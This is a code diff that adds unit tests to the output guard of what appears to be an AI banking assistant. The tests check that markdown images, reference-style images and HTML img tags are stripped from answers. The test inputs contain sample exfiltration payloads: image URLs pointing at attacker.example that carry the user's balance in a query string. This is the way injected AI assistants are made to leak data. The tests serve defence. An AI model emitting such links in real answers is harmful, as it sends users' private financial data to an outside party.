@@ -24,12 +24,14 @@ from ag_ui.core import (
 
 from app.guardrails.grounding import Evidence
 from app.guardrails.output_guard import (
+    IMAGE_METRIC,
     PII_METRIC,
     RUN_ERROR_MESSAGE,
     RUN_ERROR_METRIC,
     SURFACE_FALLBACK,
     UNGROUNDED_FALLBACK,
     OutputGuard,
+    released_text,
     split_sentences,
 )
 
@@ -94,6 +96,37 @@ def test_an_asterisk_mask_inside_bold_reaches_the_client_as_bullets(evidence: Ev
     line = "- **Cuenta corriente en pesos (****4521):** $ 1.254.300,50\n"
     out = _run(OutputGuard(evidence), _text_events(line[:20], line[20:]))
     assert _text(out) == "- **Cuenta corriente en pesos (••••4521):** $ 1.254.300,50\n"
+
+
+@pytest.fixture
+def balance_evidence() -> Evidence:
+    found = Evidence()
+    found.add({"balance": "1500.00"})
+    return found
+
+
+def test_a_markdown_image_is_released_as_its_alt_text_with_no_url(
+    balance_evidence: Evidence, caplog: pytest.LogCaptureFixture
+) -> None:
+    deltas = ("Tu saldo es 1.500 ![x](https://attacker", ".example/p?d=1.500)")
+    with caplog.at_level(logging.WARNING):
+        text = _text(_run(OutputGuard(balance_evidence), _text_events(*deltas)))
+    assert text == "Tu saldo es 1.500 x"
+    assert IMAGE_METRIC in [getattr(record, "metric", None) for record in caplog.records]
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        "Listo. ![Saldo. Ver](https://attacker.example/p?d=1.500) Saludos.",
+        "Listo. ![x][ref]\n\n[ref]: https://attacker.example/p?d=1.500\n",
+        'Listo. <IMG src="https://attacker.example/p?d=1.500"> Saludos.',
+    ],
+)
+def test_no_image_survives_in_any_form(balance_evidence: Evidence, answer: str) -> None:
+    text = released_text(answer, balance_evidence)
+    assert "![" not in text
+    assert "<img" not in text.lower()
 
 
 def test_bold_figures_keep_their_asterisks(evidence: Evidence) -> None:
